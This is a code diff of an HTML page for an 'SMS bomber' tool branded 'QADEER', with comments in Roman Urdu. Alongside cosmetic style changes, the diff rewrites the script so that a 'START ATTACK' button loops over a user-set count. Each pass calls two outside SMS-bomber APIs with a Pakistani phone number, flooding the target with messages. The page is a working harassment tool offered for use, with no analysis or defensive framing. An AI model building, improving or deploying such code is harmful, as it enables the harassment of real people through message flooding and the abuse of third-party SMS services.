@@ -7,14 +7,16 @@
     body {
       margin: 0;
       font-family: 'Courier New', monospace;
-      background: white;
-      color: #e0e0e0; 
+      background: white; /* Background white kar diya hai */
+      color: #333; /* Text color dark kar diya hai takay white background par nazar aye */
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: flex-start;
       height: 100vh;
     }
+
+    /* Baaqi styles wesay hi hain */
     nav {
       width: 100%;
       background: rgba(0, 255, 136, 0.12);
@@ -25,48 +27,55 @@
       padding: 12px 30px;
       box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
     }
+
     nav h1 {
       font-size: 22px;
-      color: #00ff88; 
+      color: #00ff88;
       text-shadow: 0 0 10px #00ff88;
     }
+
     nav ul {
       list-style: none;
       display: flex;
       gap: 25px;
     }
+
     nav ul li a {
       cursor: pointer;
       font-size: 16px;
-      color: #ff00ff; 
+      color: #ff00ff;
       text-decoration: none;
       transition: color 0.3s, text-shadow 0.3s;
     }
+
     nav ul li a:hover {
-      color: #00ffff; 
+      color: #00ffff;
       text-shadow: 0 0 10px #00ffff;
     }
+
     .card {
-      margin-top: 40px;
-      background: rgba(255,255,255,0.06);
+      margin-top: 60px;
+      background: rgba(0,0,0,0.08); /* Card ka background thora dark kar diya takay white par nazar aye */
       backdrop-filter: blur(12px);
       padding: 30px;
       border-radius: 20px;
       box-shadow: 0 0 40px rgba(255,0,255,0.4);
-      width: 380px;
+      width: 350px;
       text-align: center;
       animation: fadeIn 1.2s ease;
     }
+
     .card h2 {
       margin-bottom: 20px;
       color: #00ffff;
       text-shadow: 0 0 12px #00ffff;
     }
-    input[type="text"], input[type="number"] {
+
+    input {
       width: 90%;
       margin: 12px 0;
       padding: 12px;
-      border: 1px solid #00ff88;
+      border: none;
       border-radius: 12px;
       background: rgba(0,0,0,0.7);
       color: #fff;
@@ -74,6 +83,7 @@
       box-shadow: 0 0 10px rgba(0,255,136,0.5);
       outline: none;
     }
+
     button {
       margin-top: 18px;
       width: 95%;
@@ -88,40 +98,26 @@
       transition: transform 0.2s, box-shadow 0.2s;
       box-shadow: 0 0 20px #ff00ff;
     }
+
     button:hover {
       transform: scale(1.05);
       box-shadow: 0 0 25px #00ffff;
     }
+
     #status {
       margin-top: 20px;
       padding: 12px;
       border-radius: 10px;
       background: rgba(0,0,0,0.5);
       min-height: 40px;
-      max-height: 120px;
+      max-height: 150px;
       overflow-y: auto;
       font-size: 14px;
       white-space: pre-line;
       color: #ff00ff;
       text-align: left;
     }
-    .server-selection {
-      margin-top: 15px;
-      padding: 10px;
-      border: 1px solid #ff00ff;
-      border-radius: 10px;
-    }
-    .server-selection h4 {
-      margin: 0 0 10px 0;
-      color: #00ffff;
-      text-align: left;
-    }
-    .server-selection div {
-      display: flex;
-      justify-content: space-around;
-      color: #fff;
-      font-size: 15px;
-    }
+
     @keyframes fadeIn {
       from {opacity: 0; transform: translateY(-20px);}
       to {opacity: 1; transform: translateY(0);}
@@ -130,7 +126,7 @@
 </head>
 <body>
   <nav>
-    <h1>😎 QADEER_KHAN 😎</h1>
+    <h1>QADEER</h1>
     <ul>
       <li><a href="https://wa.me/923151105391" target="_blank">Contact</a></li>
     </ul>
@@ -138,70 +134,42 @@
 
   <div class="card">
     <h2>🚀 TESTING SECURITY SPEED 🚀</h2>
-    
-    <div class="server-selection">
-      <h4>Select Your Server:</h4>
-      <div>
-        <label><input type="radio" name="server" value="server1"> Server 1</label>
-        <label><input type="radio" name="server" value="server2"> Server 2</label>
-      </div>
-    </div>
-
-    <input type="text" id="number" placeholder="Enter Number e.g 315xxxxxxx" required pattern="3[0-9]{9}" title="Number must start with 3 and be 10 digits long.">
-    <input type="number" id="amount" placeholder="Enter Amount" required min="1">
-    
+    <input type="text" id="number" placeholder="315xxxxxxx">
+    <input type="number" id="amount" placeholder="Enter Amount">
     <button onclick="startAttack()">START ATTACK</button>
-    
     <div id="status">Status: Waiting...</div>
   </div>
 
   <script>
     async function startAttack() {
       const number = document.getElementById("number").value.trim();
-      const amount = document.getElementById("amount").value.trim();
+      const amount = parseInt(document.getElementById("amount").value.trim()) || 1;
       const statusBox = document.getElementById("status");
-      
-      const selectedServer = document.querySelector('input[name="server"]:checked');
 
-      if (!selectedServer) {
-        statusBox.textContent = "⚠️ Please select a server first!";
-        return;
-      }
-      
-      if (!number || !/3[0-9]{9}/.test(number)) {
-        statusBox.textContent = "⚠️ Required number must start with 3 and be 10 digits.";
+      if (!number || number.length < 10) {
+        statusBox.textContent = "⚠️ Please enter a valid 10-digit number!";
         return;
       }
 
-      if (!amount || parseInt(amount) < 1) {
-        statusBox.textContent = "⚠️ Count (Amount) is required!";
-        return;
-      }
-
-      const serverValue = selectedServer.value;
-      const serverName = selectedServer.parentElement.textContent.trim();
-      statusBox.textContent = `🚀 Sending task to ${serverName}...`;
+      statusBox.textContent = "🚀 Launching...";
       
-      let url = '';
-      if (serverValue === 'server1') {
-        // Server 1 ki API ko amount pass kiya
-        url = `https://famofcfallxd.serv00.net/apis/api.php?number=92${number}&amount=1`;
-      } else {
-        // Server 2 ki API ko bhi amount pass kiya
-        url = `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=92${number}&amount=1`;
-      }
-      
-      try {
-        // Loop khatam kar diya, ab sirf aik request jaye gi
-        const response = await fetch(url);
-        if (!response.ok) {
-          throw new Error(`Server responded with status: ${response.status}`);
+      for (let i = 1; i <= amount; i++) {
+        const url1 = `https://famofcfallxd.serv00.net/apis/api.php?number=92${number}&amount=1`;
+        const url2 = `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=92${number}`;
+        
+        try {
+          await Promise.all([
+            fetch(url1),
+            fetch(url2)
+          ]);
+          statusBox.textContent += `\n[${i}] ✅ APIs Called | QADEER`;
+        } catch (err) {
+          statusBox.textContent += `\n[${i}] ❌ Error | QADEER`;
+          console.error(err);
         }
-        statusBox.textContent += `\n\n✅ Task successfully sent to ${serverName}!`;
-      } catch (err) {
-        statusBox.textContent += `\n\n❌ Failed to send task to ${serverName}.`;
-        console.error(err);
+        statusBox.scrollTop = statusBox.scrollHeight;
       }
+      statusBox.textContent += `\n\n🎉 Attack Finished!`;
       statusBox.scrollTop = statusBox.scrollHeight;
     }
   </script>
